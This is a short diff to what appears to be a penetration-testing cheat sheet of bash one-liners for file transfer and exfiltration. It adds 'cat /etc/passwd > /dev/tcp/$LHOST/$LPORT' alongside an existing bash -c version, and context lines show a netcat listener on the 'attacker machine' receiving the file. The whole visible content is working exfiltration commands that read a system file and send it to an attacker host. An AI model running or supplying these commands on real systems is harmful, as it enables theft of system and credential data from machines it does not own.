@@ -71,5 +71,6 @@ bash -c "cat < /dev/tcp/$LHOST/$LPORT" > filename
 On attacker machine, `nc -lvnp $LPORT < filename`
 # exfiltrate files bash pipe tcp
 ```bash
+cat /etc/passwd > /dev/tcp/$LHOST/$LPORT
 bash -c "cat /etc/passwd > /dev/tcp/$LHOST/$LPORT"
 ```
